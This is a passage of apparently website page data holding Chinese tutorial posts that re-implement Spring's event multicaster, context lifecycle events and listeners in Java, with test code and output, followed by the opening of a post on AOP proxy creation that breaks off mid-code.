}\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 2. ContextClosedEvent：容器关闭事件\n\npublic class ContextClosedEvent extends ApplicationContextEvent {\n\n    private static final long serialVersionUID = 9130139349987597886L;\n\n    public ContextClosedEvent(Object source) {\n        super(source);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 将实现加入原有的逻辑中：\n\n 1. 为了方便，直接让容器具备发布事件的能力，所以让 ApplicationContext 这个顶层接口继承 ApplicationEventPublisher，在 AbstractApplicationContext 中实现发布事件方法即可。\n\npublic interface ApplicationContext extends ListableBeanFactory, HierarchicalBeanFactory, ResourceLoader, ApplicationEventPublisher {\n\n}\n\n\n1\n2\n3\n\n\npublic abstract class AbstractApplicationContext \n    extends DefaultResourceLoader \n    // ConfigurableApplicationContext 继承了 ApplicationContext\n    implements ConfigurableApplicationContext {\n    @Override\n    public void publishEvent(ApplicationEvent event) {\n        applicationEventMulticaster.multicastEvent(event);\n    }  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 2. 完善 refresh() 加入 7、8、9 步骤，完成事件多播器和事件监听器的注册，加入容器事件的发布。\n\npublic abstract class AbstractApplicationContext \n    extends DefaultResourceLoader \n    implements ConfigurableApplicationContext {\n    \n    private static final String APPLICATION_EVENT_MULTICASTER_BEAN_NAME = "applicationEventMulticaster";\n\n    private ApplicationEventMulticaster applicationEventMulticaster; \n    \n   \t@Override\n    public void refresh() {\n        // 1. 创建 Bean 工厂，加载 BeanDefinition\n        refreshBeanFactory();\n\n        // 2. 获得 Bean 工厂\n        ConfigurableListableBeanFactory beanFactory = getBeanFactory();\n        // 6. 添加 ApplicationContextAware 的后置处理器\n        // 使 Bean 创建时（BeanPostProcessor前置处理器）的时候可以感知到容器上下文\n        beanFactory.addBeanPostProcessor(new ApplicationContextAwareProcessor(this));\n\n        // 3. BeanDefinition 扩展点：\n        // Spring 容器中 BeanDefinition 的扩展点。\n        // 创建 BeanDefinition 之后，但在创建 Bean 实例之前。\n        invokeBeanFactoryPostProcessors(beanFactory);\n\n        // 4. Bean 扩展点：\n        // 提前注册所有的 BeanPostProcessor，在 Bean 创建后，初始化时扩展\n        // （见 AbstractAutowireCapableBeanFactory.createBean ）。\n        registerBeanPostProcessors(beanFactory);\n\n        // 7. 初始化事件多播器\n        initApplicationEventMulticaster();\n\n        // 8. 注册所有的事件监听器\n        registerListeners();\n\n        // 5. 提前实例化所有的单例 Bean\n        beanFactory.preInstantiateSingletons();\n\n        // 9. 所有工作已就绪，发布容器刷新完成事件\n        finishRefresh();\n    }\n\n    private void finishRefresh() {\n        publishEvent(new ContextRefreshedEvent(this));\n    }\n\n    private void registerListeners() {\n        Collection<ApplicationListener> applicationListeners = getBeansOfType(ApplicationListener.class).values();\n        for (ApplicationListener listener : applicationListeners) {\n            applicationEventMulticaster.addApplicationListener(listener);\n        }\n    }\n\n    private void initApplicationEventMulticaster() {\n        ConfigurableListableBeanFactory beanFactory = getBeanFactory();\n        applicationEventMulticaster = new SimpleApplicationEventMulticaster();\n        beanFactory.registerSingleton(APPLICATION_EVENT_MULTICASTER_BEAN_NAME, applicationEventMulticaster);\n    }\n    \n    @Override\n    public void close() {\n        // 发布容器关闭事件\n        publishEvent(new ContextClosedEvent(this));\n        // 执行各个单例 Bean 的销毁方法\n        getBeanFactory().destroySingletons();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n\n\n\n# 测试：\n\n * xml 准备，容器启动时提前注册所有的监听器。\n\n<?xml version="1.0" encoding="utf-8" ?>\n<beans>\n    <bean class="com.snail.springframework.beans.factory.event.CustomEventListener"/>\n    <bean class="com.snail.springframework.beans.factory.event.ContextRefreshedEventListener"/>\n    <bean class="com.snail.springframework.beans.factory.event.ContextClosedEventListener"/>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n\n\n * 这里我们准备一个 2个容器监听器，监听容器刷新完成和容器关闭事件。\n   \n   另准备一个自定义事件和自定义事件监听器，用来手动发布。\n\n/**\n * 监听容器刷新完成事件\n */\npublic class ContextRefreshedEventListener implements ApplicationListener<ContextRefreshedEvent> {\n\n    @Override\n    public void onApplicationEvent(ContextRefreshedEvent event) {\n        System.out.println("收到事件 ContextRefreshedEvent：" + event);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n/**\n * 监听容器关闭事件\n */\npublic class ContextClosedEventListener implements ApplicationListener<ContextClosedEvent> {\n\n    @Override\n    public void onApplicationEvent(ContextClosedEvent event) {\n        System.out.println("收到事件 ContextClosedEvent：" + event);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n/**\n * 自定义事件\n */\npublic class CustomEvent extends ApplicationContextEvent {\n\n    private static final long serialVersionUID = 2651556915889874385L;\n    private String id;\n    private String message;\n\n    public CustomEvent(Object source, String id, String message) {\n        super(source);\n        this.id = id;\n        this.message = message;\n    }\n\n    public String getId() {\n        return id;\n    }\n\n    public void setId(String id) {\n        this.id = id;\n    }\n\n    public String getMessage() {\n        return message;\n    }\n\n    public void setMessage(String message) {\n        this.message = message;\n    }\n\n    @Override\n    public String toString() {\n        return "CustomEvent{" +\n                "id=\'" + id + \'\\\'\' +\n                ", message=\'" + message + \'\\\'\' +\n                ", source=" + source +\n                \'}\';\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n/**\n * 自定义事件监听\n */\npublic class CustomEventListener implements ApplicationListener<CustomEvent> {\n\n    @Override\n    public void onApplicationEvent(CustomEvent event) {\n        System.out.println("收到事件 CustomEvent：" + event);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n * 测试类\n\npublic class ApplicationListenerTest {\n\n    /**\n     * 测试事件\n     */\n    @Test\n    public void test_event() {\n        ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext("classpath:spring-event.xml");\n        applicationContext.publishEvent(new CustomEvent(applicationContext, "13", "哟哟哟~"));\n        applicationContext.registerShutdownHook();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n * 测试结果\n\n收到事件 ContextRefreshedEvent：com.snail.springframework.context.event.ContextRefreshedEvent[source=com.snail.springframework.context.support.ClassPathXmlApplicationContext@26ba2a48]\n收到事件 CustomEvent：CustomEvent{id=\'13\', message=\'哟哟哟~\', source=com.snail.springframework.context.support.ClassPathXmlApplicationContext@26ba2a48}\n收到事件 ContextClosedEvent：com.snail.springframework.context.event.ContextClosedEvent[source=com.snail.springframework.context.support.ClassPathXmlApplicationContext@26ba2a48]\n\nProcess finished with exit code 0\n\n\n1\n2\n3\n4\n5\n\n\n\n# 总结\n\nSpring 在容器启动的时候会注册多播器和所有的事件监听器，同时也会注册一些容器自带事件（如容器刷新完成事件、容器关闭事件）。\n\n在向容器手动发布事件后，容器会通过多播器获取到所有订阅了该事件的监听器（具体实现参考AbstractApplicatioinEventMulticaster#getApplicationListeners(ApplicationEvent event)遍历所有的监听器，看监听器泛型是否和指定事件所匹配），回调监听器的方法来实现事件的监听。\n\n 1. 监听器注册\n\n首先，在 Spring 容器启动过程中，所有的事件监听器会被注册到事件多播器中。通过调用 ApplicationEventMulticaster 的 addApplicationListener 方法，可以向事件多播器中添加一个新的事件监听器。同时，可以使用 removeApplicationListener 来删除一个已经注册的事件监听器。\n\n 2. 事件发布\n\n当一个事件被触发时，事件源将会把事件发布出去。在 Spring 中，事件通常通过 ApplicationContext 的 publishEvent 方法来发布。这个方法会依次调用所有注册到容器中的事件多播器，并将事件分发给它们。\n\n在事件多播器中，会按照一定的顺序遍历监听器列表，将事件分发给每个监听器。具体的分发逻辑可以由具体的事件多播器实现类来实现。例如，SimpleApplicationEventMulticaster 使用同步方式调用每个监听器的 onApplicationEvent 方法，而 AsyncApplicationEventMulticaster 则使用异步方式执行任务。\n\n 3. 事件监听器的执行\n\n当事件多播器将事件分发给每个事件监听器时，会调用每个监听器的 onApplicationEvent 方法来处理事件。这个方法由具体的事件监听器实现，并且需要根据具体的业务场景来编写。',normalizedContent:' * 解析\n * 实现 事件发布订阅 的各个角色\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n * 将 事件能力 和容器结合\n   * 定义一些职责和能力：\n   * 具体的实现：\n   * 将实现加入原有的逻辑中：\n   * 测试：\n * 总结\n\n\n\n\n# 解析\n\nspring 事件多播器（applicationeventmulticaster）是 spring framework 中的一个重要组件，用于管理和多播（分发）事件到所有的事件监听器。\n\n在 spring 应用中，通常会有多个事件监听器来监听不同类型的事件，当有事件触发时，事件源将会把事件发布出去。而事件多播器就是用来接收这些事件，然后将其分发给所有的事件监听器。在 spring 容器中，通常使用 applicationeventmulticaster 实现事件的发布和监听。\n\n在 spring 中，可以使用 simpleapplicationeventmulticaster、synctaskexecutor、simplethreadscope 等类来实现事件多播器。其中，simpleapplicationeventmulticaster 是最简单的实现，它使用 java 的线程机制实现了同步调用事件监听器。具体来说，simpleapplicationeventmulticaster 持有一个监听器列表，并提供了 addapplicationlistener 和 removeapplicationlistener 方法来添加和删除事件监听器。而当一个事件被触发时，它会按照一定的顺序遍历监听器列表，将事件分发给每个监听器。\n\n除了 simpleapplicationeventmulticaster，spring 还提供了另一种默认的事件多播器实现：asyncapplicationeventmulticaster。与 simpleapplicationeventmulticaster 不同的是，asyncapplicationeventmulticaster 支持异步调用事件监听器。具体来说，asyncapplicationeventmulticaster 通过 executor（线程池）来管理异步执行的任务，以便将事件的发布和监听从主线程中分离出来，达到异步执行的效果。\n\n需要注意的是，在使用多播器时，应该考虑事件监听器的数量以及监听器的执行时间等因素，以防止事件多播器成为系统的性能瓶颈。在实际使用中，可以通过调整线程池大小、监听器执行顺序、优化监听器代码等方式来提高事件多播器的性能和稳定性。\n\n\n# 实现 事件发布订阅 的各个角色\n\n基于观察者模式，完成一系列事件的管理就必须有以下几个角色：\n\n 1. 事件：一个具体的事件体本身；\n 2. 事件监听者：监听指定的事件；\n 3. 事件发布者：具有发布事件的能力；\n 4. 事件多播器：对前三者的统一管理，相当于事件注册中心，可以添加、删除事件监听器，可以发布指定的事件；\n\n\n# 定义一些职责和能力：\n\n 1. applicationevent：一个具体的事件，这个还比较顶层，所以我们再创建一个 applicationcontextevent 更具体的来表明这是一个容器事件。\n\npublic abstract class applicationevent extends eventobject {\n\n    private static final long serialversionuid = 5949591757825084930l;\n\n    public applicationevent(object source) {\n        super(source);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\npublic class applicationcontextevent extends applicationevent {\n\n    private static final long serialversionuid = -2652382590021151001l;\n\n    public applicationcontextevent(object source) {\n        super(source);\n    }\n\n    /**\n     * 获取应用程序上下文，上下文肯定是容有参构造传递过来的\n     *\n     * @return {@link applicationcontext}\n     */\n    public applicationcontext getapplicationcontext() {\n        return (applicationcontext) getsource();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n 2. applicationlistener：事件监听器\n\npublic interface applicationlistener<e extends applicationevent> extends eventlistener {\n\n    /**\n     * 事件触发时会回调这个方法\n     *\n     * @param event 事件\n     */\n    void onapplicationevent(e event);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n 3. applicationeventpublisher：定义事件发布者，所有的事件都需要从这个接口发布出去\n\npublic interface applicationeventpublisher {\n\n    /**\n     * 发布事件\n     *\n     * @param event 事件\n     */\n    void publishevent(applicationevent event);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n 4. applicationeventmulticaster：事件多播器\n\npublic interface applicationeventmulticaster {\n\n    /**\n     * 添加一个监听器\n     *\n     * @param listener 监听器\n     */\n    void addapplicationlistener(applicationlistener<?> listener);\n\n    /**\n     * 删除一个监听器\n     *\n     * @param listener 监听器\n     */\n    void removeapplicationlistener(applicationlistener<?> listener);\n\n    /**\n     * 发布一个事件\n     *\n     * @param event 事件\n     */\n    void multicastevent(applicationevent event);\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# 具体的实现：\n\n具体的实现无非就是对多播器的事件，因为多播器的定义以及包括了对事件的发布以及事件监听器的注册。这里先使用抽象类 abstractapplicatioineventmulticaster 默认实现多播器中事件监听器的注册、添加以及获取指定事件监听器的方法，把发布事件留给不同子类实现，以方便不同的扩展。\n\n 1. abstractapplicatioineventmulticaster：多播器的抽象实现类。\n\npublic abstract class abstractapplicatioineventmulticaster implements applicationeventmulticaster, beanfactoryaware {\n\n    private final set<applicationlistener<applicationevent>> applicationlisteners = new linkedhashset<>();\n\n    private beanfactory beanfactory;\n\n    @override\n    public void addapplicationlistener(applicationlistener<?> listener) {\n        applicationlisteners.add((applicationlistener<applicationevent>) listener);\n    }\n\n    @override\n    public void removeapplicationlistener(applicationlistener<?> listener) {\n        applicationlisteners.remove(listener);\n    }\n\n    @override\n    public void setbeanfactory(beanfactory beanfactory) {\n        this.beanfactory = beanfactory;\n    }\n\n    /**\n     * 获取订阅了某个事件的所有监听器\n     *\n     * @param event 事件\n     * @return {@link collection}<{@link applicationlistener}>\n     */\n    protected collection<applicationlistener<applicationevent>> getapplicationlisteners(applicationevent event) {\n        linkedlist<applicationlistener<applicationevent>> alllisteners = new linkedlist<>();\n        for (applicationlistener<applicationevent> listener : applicationlisteners) {\n            if (supportsevent(listener, event)) {\n                alllisteners.add(listener);\n            }\n        }\n        return alllisteners;\n    }\n\n    private boolean supportsevent(applicationlistener<applicationevent> listener, applicationevent event) {\n        class<? extends applicationlistener> listenerclass = listener.getclass();\n        // 主要是用来获取当前类的接口，但当前类创建时可能是cglib或jdk代理实现的\n        // jdk动态代理的代理类已经实现了接口，直接使用该 class 对象即可。\n        class<?> targetclass = listenerclass;\n        // 判断是否是 cglib 代理类，如果是，就获取其父类的 class 对象，否则直接使用该 class 对象。\n        if (listenerclass.getname().contains("$$")) {\n            targetclass = listenerclass.getsuperclass();\n        }\n\n        // 获取事件监听器实现的第一个泛型接口（即 applicationlistener）\n        type genericinterfaces = targetclass.getgenericinterfaces()[0];\n\n        // 获取该接口的实际泛型参数类型，因为只有一个取第一个即可。\n        type actualtypeargument = ((parameterizedtype) genericinterfaces).getactualtypearguments()[0];\n\n        // 获取泛型的全类名并得到class，用于事件类型对比\n        string eventclassname = actualtypeargument.gettypename();\n        class<?> eventclass;\n        try {\n            eventclass = class.forname(eventclassname);\n        } catch (classnotfoundexception e) {\n            throw new beansexception("wrong evnet class name: " + eventclassname);\n        }\n\n        // 判断泛型和事件是否匹配\n        // 父类.class.isassignablefrom(子类.class)\n        // 子类实例 instanceof 父类类型\n        return eventclass.isassignablefrom(event.getclass());\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n 2. simpleapplicationeventmulticaster：使用同步方式调用每个监听器的 onapplicationevent 方法。\n\npublic class simpleapplicationeventmulticaster extends abstractapplicatioineventmulticaster {\n\n    @override\n    public void multicastevent(applicationevent event) {\n        for (applicationlistener<applicationevent> listener : getapplicationlisteners(event)) {\n            listener.onapplicationevent(event);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 将实现加入原有的逻辑中：\n\n * 无\n\n\n# 将 事件能力 和容器结合\n\n想一想，怎么把现有的事件相关者和 spring 容器相结合呢？\n\n其实无非就是在容器启动（refresh()）的时候，将事件多播器和所有的事件监听器提前加载到容器中。\n\n当然，也可以提前定义容器的生命周期事件：contextrefreshedevent（容器刷新完成事件），contextclosedevent（容器关闭事件）在容器启动时就加载到容器中。\n\n\n# 定义一些职责和能力：\n\n * 无\n\n\n# 具体的实现：\n\n 1. contextrefreshedevent：容器刷新完成事件\n\npublic class contextrefreshedevent extends applicationcontextevent {\n   \n    private static final long serialversionuid = 5264064757132179583l;\n\n    public contextrefreshedevent(object source) {\n        super(source);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 2. contextclosedevent：容器关闭事件\n\npublic class contextclosedevent extends applicationcontextevent {\n\n    private static final long serialversionuid = 9130139349987597886l;\n\n    public contextclosedevent(object source) {\n        super(source);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 将实现加入原有的逻辑中：\n\n 1. 为了方便，直接让容器具备发布事件的能力，所以让 applicationcontext 这个顶层接口继承 applicationeventpublisher，在 abstractapplicationcontext 中实现发布事件方法即可。\n\npublic interface applicationcontext extends listablebeanfactory, hierarchicalbeanfactory, resourceloader, applicationeventpublisher {\n\n}\n\n\n1\n2\n3\n\n\npublic abstract class abstractapplicationcontext \n    extends defaultresourceloader \n    // configurableapplicationcontext 继承了 applicationcontext\n    implements configurableapplicationcontext {\n    @override\n    public void publishevent(applicationevent event) {\n        applicationeventmulticaster.multicastevent(event);\n    }  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 2. 完善 refresh() 加入 7、8、9 步骤，完成事件多播器和事件监听器的注册，加入容器事件的发布。\n\npublic abstract class abstractapplicationcontext \n    extends defaultresourceloader \n    implements configurableapplicationcontext {\n    \n    private static final string application_event_multicaster_bean_name = "applicationeventmulticaster";\n\n    private applicationeventmulticaster applicationeventmulticaster; \n    \n   \t@override\n    public void refresh() {\n        // 1. 创建 bean 工厂，加载 beandefinition\n        refreshbeanfactory();\n\n        // 2. 获得 bean 工厂\n        configurablelistablebeanfactory beanfactory = getbeanfactory();\n        // 6. 添加 applicationcontextaware 的后置处理器\n        // 使 bean 创建时（beanpostprocessor前置处理器）的时候可以感知到容器上下文\n        beanfactory.addbeanpostprocessor(new applicationcontextawareprocessor(this));\n\n        // 3. beandefinition 扩展点：\n        // spring 容器中 beandefinition 的扩展点。\n        // 创建 beandefinition 之后，但在创建 bean 实例之前。\n        invokebeanfactorypostprocessors(beanfactory);\n\n        // 4. bean 扩展点：\n        // 提前注册所有的 beanpostprocessor，在 bean 创建后，初始化时扩展\n        // （见 abstractautowirecapablebeanfactory.createbean ）。\n        registerbeanpostprocessors(beanfactory);\n\n        // 7. 初始化事件多播器\n        initapplicationeventmulticaster();\n\n        // 8. 注册所有的事件监听器\n        registerlisteners();\n\n        // 5. 提前实例化所有的单例 bean\n        beanfactory.preinstantiatesingletons();\n\n        // 9. 所有工作已就绪，发布容器刷新完成事件\n        finishrefresh();\n    }\n\n    private void finishrefresh() {\n        publishevent(new contextrefreshedevent(this));\n    }\n\n    private void registerlisteners() {\n        collection<applicationlistener> applicationlisteners = getbeansoftype(applicationlistener.class).values();\n        for (applicationlistener listener : applicationlisteners) {\n            applicationeventmulticaster.addapplicationlistener(listener);\n        }\n    }\n\n    private void initapplicationeventmulticaster() {\n        configurablelistablebeanfactory beanfactory = getbeanfactory();\n        applicationeventmulticaster = new simpleapplicationeventmulticaster();\n        beanfactory.registersingleton(application_event_multicaster_bean_name, applicationeventmulticaster);\n    }\n    \n    @override\n    public void close() {\n        // 发布容器关闭事件\n        publishevent(new contextclosedevent(this));\n        // 执行各个单例 bean 的销毁方法\n        getbeanfactory().destroysingletons();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n\n\n\n# 测试：\n\n * xml 准备，容器启动时提前注册所有的监听器。\n\n<?xml version="1.0" encoding="utf-8" ?>\n<beans>\n    <bean class="com.snail.springframework.beans.factory.event.customeventlistener"/>\n    <bean class="com.snail.springframework.beans.factory.event.contextrefreshedeventlistener"/>\n    <bean class="com.snail.springframework.beans.factory.event.contextclosedeventlistener"/>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n\n\n * 这里我们准备一个 2个容器监听器，监听容器刷新完成和容器关闭事件。\n   \n   另准备一个自定义事件和自定义事件监听器，用来手动发布。\n\n/**\n * 监听容器刷新完成事件\n */\npublic class contextrefreshedeventlistener implements applicationlistener<contextrefreshedevent> {\n\n    @override\n    public void onapplicationevent(contextrefreshedevent event) {\n        system.out.println("收到事件 contextrefreshedevent：" + event);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n/**\n * 监听容器关闭事件\n */\npublic class contextclosedeventlistener implements applicationlistener<contextclosedevent> {\n\n    @override\n    public void onapplicationevent(contextclosedevent event) {\n        system.out.println("收到事件 contextclosedevent：" + event);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n/**\n * 自定义事件\n */\npublic class customevent extends applicationcontextevent {\n\n    private static final long serialversionuid = 2651556915889874385l;\n    private string id;\n    private string message;\n\n    public customevent(object source, string id, string message) {\n        super(source);\n        this.id = id;\n        this.message = message;\n    }\n\n    public string getid() {\n        return id;\n    }\n\n    public void setid(string id) {\n        this.id = id;\n    }\n\n    public string getmessage() {\n        return message;\n    }\n\n    public void setmessage(string message) {\n        this.message = message;\n    }\n\n    @override\n    public string tostring() {\n        return "customevent{" +\n                "id=\'" + id + \'\\\'\' +\n                ", message=\'" + message + \'\\\'\' +\n                ", source=" + source +\n                \'}\';\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n/**\n * 自定义事件监听\n */\npublic class customeventlistener implements applicationlistener<customevent> {\n\n    @override\n    public void onapplicationevent(customevent event) {\n        system.out.println("收到事件 customevent：" + event);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n * 测试类\n\npublic class applicationlistenertest {\n\n    /**\n     * 测试事件\n     */\n    @test\n    public void test_event() {\n        classpathxmlapplicationcontext applicationcontext = new classpathxmlapplicationcontext("classpath:spring-event.xml");\n        applicationcontext.publishevent(new customevent(applicationcontext, "13", "哟哟哟~"));\n        applicationcontext.registershutdownhook();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n * 测试结果\n\n收到事件 contextrefreshedevent：com.snail.springframework.context.event.contextrefreshedevent[source=com.snail.springframework.context.support.classpathxmlapplicationcontext@26ba2a48]\n收到事件 customevent：customevent{id=\'13\', message=\'哟哟哟~\', source=com.snail.springframework.context.support.classpathxmlapplicationcontext@26ba2a48}\n收到事件 contextclosedevent：com.snail.springframework.context.event.contextclosedevent[source=com.snail.springframework.context.support.classpathxmlapplicationcontext@26ba2a48]\n\nprocess finished with exit code 0\n\n\n1\n2\n3\n4\n5\n\n\n\n# 总结\n\nspring 在容器启动的时候会注册多播器和所有的事件监听器，同时也会注册一些容器自带事件（如容器刷新完成事件、容器关闭事件）。\n\n在向容器手动发布事件后，容器会通过多播器获取到所有订阅了该事件的监听器（具体实现参考abstractapplicatioineventmulticaster#getapplicationlisteners(applicationevent event)遍历所有的监听器，看监听器泛型是否和指定事件所匹配），回调监听器的方法来实现事件的监听。\n\n 1. 监听器注册\n\n首先，在 spring 容器启动过程中，所有的事件监听器会被注册到事件多播器中。通过调用 applicationeventmulticaster 的 addapplicationlistener 方法，可以向事件多播器中添加一个新的事件监听器。同时，可以使用 removeapplicationlistener 来删除一个已经注册的事件监听器。\n\n 2. 事件发布\n\n当一个事件被触发时，事件源将会把事件发布出去。在 spring 中，事件通常通过 applicationcontext 的 publishevent 方法来发布。这个方法会依次调用所有注册到容器中的事件多播器，并将事件分发给它们。\n\n在事件多播器中，会按照一定的顺序遍历监听器列表，将事件分发给每个监听器。具体的分发逻辑可以由具体的事件多播器实现类来实现。例如，simpleapplicationeventmulticaster 使用同步方式调用每个监听器的 onapplicationevent 方法，而 asyncapplicationeventmulticaster 则使用异步方式执行任务。\n\n 3. 事件监听器的执行\n\n当事件多播器将事件分发给每个事件监听器时，会调用每个监听器的 onapplicationevent 方法来处理事件。这个方法由具体的事件监听器实现，并且需要根据具体的业务场景来编写。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"手写 Spring 13 - 改造代理对象的创建过程及代理对象的属性填充",frontmatter:{title:"手写 Spring 13 - 改造代理对象的创建过程及代理对象的属性填充",date:"2024-05-06T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-source-13.html",relativePath:"views/backend/spring-source-13.md",key:"v-14eaa6e0",path:"/views/backend/spring-source-13.html",headers:[{level:2,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:3},{level:2,title:"改造代理对象的创建过程",slug:"改造代理对象的创建过程",normalizedTitle:"改造代理对象的创建过程",charIndex:9},{level:3,title:"定义一些职责和能力",slug:"定义一些职责和能力",normalizedTitle:"定义一些职责和能力",charIndex:26},{level:3,title:"具体的实现",slug:"具体的实现",normalizedTitle:"具体的实现",charIndex:41},{level:3,title:"将实现加入原有的逻辑中",slug:"将实现加入原有的逻辑中",normalizedTitle:"将实现加入原有的逻辑中",charIndex:52},{level:3,title:"测试",slug:"测试",normalizedTitle:"测试",charIndex:69},{level:2,title:"代理对象的属性填充",slug:"代理对象的属性填充",normalizedTitle:"代理对象的属性填充",charIndex:75},{level:3,title:"定义一些职责和能力",slug:"定义一些职责和能力-2",normalizedTitle:"定义一些职责和能力",charIndex:26},{level:3,title:"具体的实现",slug:"具体的实现-2",normalizedTitle:"具体的实现",charIndex:41},{level:3,title:"将实现加入原有的逻辑中",slug:"将实现加入原有的逻辑中-2",normalizedTitle:"将实现加入原有的逻辑中",charIndex:52},{level:3,title:"测试",slug:"测试-2",normalizedTitle:"测试",charIndex:69},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:139}],excerpt:"<Boxx/>\n",headersStr:"解析 改造代理对象的创建过程 定义一些职责和能力 具体的实现 将实现加入原有的逻辑中 测试 代理对象的属性填充 定义一些职责和能力 具体的实现 将实现加入原有的逻辑中 测试 总结",content:' * 解析\n * 改造代理对象的创建过程\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 代理对象的属性填充\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 总结\n\n\n\n\n# 解析\n\n改造 bean 的创建过程，将代理对象的创建由原先的 bean 实例化之前创建，改为 bean 实例化之后，在 BeanPostProcessor 的初始化后置处理实现。\n\n\n# 改造代理对象的创建过程\n\n原先 aop 代理对象的创建是在 bean 实例化之前（DefaultAdvisorAutoProxyCreator#postProcessBeforeInstantiation()）创建的，现在改为在 BeanPostProcessor 的初始化后置处理实现（DefaultAdvisorAutoProxyCreator#postProcessAfterInitialization()）。\n\n在创建代理对象时，又由于最终会调用 TargetSource#getTargetClass() 获取接口，所以改造为判断是 cglib 还是 jdk 的代理接口按需返回。\n\n\n# 定义一些职责和能力\n\n 1. 无\n\n\n# 具体的实现\n\n 1. DefaultAdvisorAutoProxyCreator 改造\n\npublic class DefaultAdvisorAutoProxyCreator implements InstantiationAwareBeanPostProcessor, BeanFactoryAware {\n\n    private DefaultListableBeanFactory beanFactory;\n\n    @Override\n    public void setBeanFactory(BeanFactory beanFactory) {\n        this.beanFactory = (DefaultListableBeanFactory) beanFactory;\n    }\n\n    @Override\n    public PropertyValues postProcessPropertyValues(PropertyValues pvs, Object bean, String beanName) {\n        return pvs;\n    }\n\n    @Override\n    public Object postProcessBeforeInstantiation(Class<?> beanClass, String beanName) throws BeansException {\n        return null;\n    }\n\n    private boolean isInfrastructureClass(Class<?> beanClass) {\n        return Advice.class.isAssignableFrom(beanClass) || Pointcut.class.isAssignableFrom(beanClass) || Advisor.class.isAssignableFrom(beanClass);\n    }\n\n    @Override\n    public Object postProcessBeforeInitialization(Object bean, String beanName) {\n        return bean;\n    }\n\n    @Override\n    public Object postProcessAfterInitialization(Object bean, String beanName) {\n        if (isInfrastructureClass(bean.getClass())) {\n            return null;\n        }\n\n        Collection<AspectJExpressionPointcutAdvisor> advisors = beanFactory.getBeansOfType(AspectJExpressionPointcutAdvisor.class).values();\n        for (AspectJExpressionPointcutAdvisor advisor : advisors) {\n            // 不匹配当前类，过滤\n            ClassFilter classFilter = advisor.getPointcut().getClassFilter();\n            if (classFilter != null && !classFilter.matches(bean.getClass())) {\n                continue;\n            }\n            